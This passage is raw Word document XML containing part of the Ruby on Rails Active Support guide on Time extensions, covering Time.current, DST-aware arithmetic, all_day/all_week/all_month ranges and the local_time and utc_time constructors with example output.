              <w:t>beginning_of_year (at_beginning_of_year)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3DA473FB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end_of_year (at_end_of_year)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="69022884" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>years_ago</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12D942F9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>years_since</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="33EAF6F7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>prev_year (last_year)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="58113786" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>next_year</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3D6AC669" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>They are analogous. Please refer to their documentation above and take into account the following differences:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="444A8A81" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="289"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>change</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> accepts an additional </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:usec</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AB040F7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="289"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Time</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> understands </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>DST</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, so you get correct </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>DST</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> calculations as in</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E8EE0CD" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="56B93638" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Time.zone_default</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A61F12A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; #&lt;ActiveSupport::TimeZone:0x7f73654d4f38 @utc_offset=nil, @name="Madrid", ...&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A6DA489" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B4DF22A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># In Barcelona, 2010/03/28 02:00 +0100 becomes 2010/03/28 03:00 +0200 due to DST.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="184FF94C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>t = Time.local_time(2010, 3, 28, 1, 59, 59)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F1B8963" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Sun Mar 28 01:59:59 +0100 2010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E727E51" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>t.advance(:seconds</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3964E416" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Sun Mar 28 03:00:00 +0200 2010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7A531D3E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="290"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>since</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ago</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> jump to a time that can’t be expressed with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Time</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>DateTime</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> object is returned instead.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6195CEA1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">17.1.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Time.current</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B24E11C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Active Support defines </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Time.current</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to be today in the current time zone. That’s like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Time.now</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, except that it honors the user time zone, if defined. It also defines </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Time.yesterday</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Time.tomorrow</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and the instance predicates </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>past?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>today?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>future?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, all of them relative to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Time.current</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60DCDB37" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When making Time comparisons using methods which honor the user time zone, make sure to use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Time.current</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and not </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Time.now</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. There are cases where the user time zone might be in the future compared to the system time zone, which </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Time.today</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> uses by default. This means </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Time.now</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> may equal </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Time.yesterday</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13D2CA57" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">17.1.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>all_day</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>all_week</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>all_month</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>all_quarter</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>all_year</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18A91AAA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>all_day</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns a range representing the whole day of the current time.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2A75BBF8" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2A70A1EF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>now = Time.current</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E010DD0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Mon, 09 Aug 2010 23:20:05 UTC +00:00</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="497BC30C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>now.all_day</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2BF67F13" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Mon, 09 Aug 2010 00:00:00 UTC +00:00..Mon, 09 Aug 2010 23:59:59 UTC +00:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="01B8D830" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Analogously, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>all_week</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>all_month</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>all_quarter</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>all_year</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> all serve the purpose of generating time ranges.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44A8AA90" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2B4A5AAB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>now = Time.current</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E85128F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Mon, 09 Aug 2010 23:20:05 UTC +00:00</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3225F0E2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>now.all_week</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7496EE62" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Mon, 09 Aug 2010 00:00:00 UTC +00:00..Sun, 15 Aug 2010 23:59:59 UTC +00:00</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5D440F19" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>now.all_month</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="170428B2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Sat, 01 Aug 2010 00:00:00 UTC +00:00..Tue, 31 Aug 2010 23:59:59 UTC +00:00</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1599FCBF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>now.all_quarter</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F81FB2F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Thu, 01 Jul 2010 00:00:00 UTC +00:00..Thu, 30 Sep 2010 23:59:59 UTC +00:00</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="488E2512" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>now.all_year</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10310C11" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Fri, 01 Jan 2010 00:00:00 UTC +00:00..Fri, 31 Dec 2010 23:59:59 UTC +00:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="15A42D9B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>17.2 Time Constructors</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56765E3C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Active Support defines </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Time.current</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to be </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Time.zone.now</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> if there’s a user time zone defined, with fallback to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Time.now</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F7CE6CD" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="160A1637" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Time.zone_default</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C02FD78" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; #&lt;ActiveSupport::TimeZone:0x7f73654d4f38 @utc_offset=nil, @name="Madrid", ...&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39C2B4FE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Time.current</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7DA64A4A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Fri, 06 Aug 2010 17:11:58 CEST +02:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="25AF324C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Analogously to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>DateTime</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, the predicates </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>past?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>future?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> are relative to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Time.current</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D294FC5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>local_time</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class method to create time objects honoring the user time zone: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9989808" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="44E62151" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Time.zone_default</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B98F7B8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; #&lt;ActiveSupport::TimeZone:0x7f73654d4f38 @utc_offset=nil, @name="Madrid", ...&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="466418C6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Time.local_time(2010, 8, 15)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09172FFC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Sun Aug 15 00:00:00 +0200 2010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4E0D61AB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>utc_time</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class method returns a time in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>UTC</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2F6A299B" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7268B323" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Time.zone_default</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35AD33A3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; #&lt;ActiveSupport::TimeZone:0x7f73654d4f38 @utc_offset=nil, @name="Madrid", ...&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="50A2B9AC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Time.utc_time(2010, 8, 15)</w:t>
            </w:r>
          </w:p>
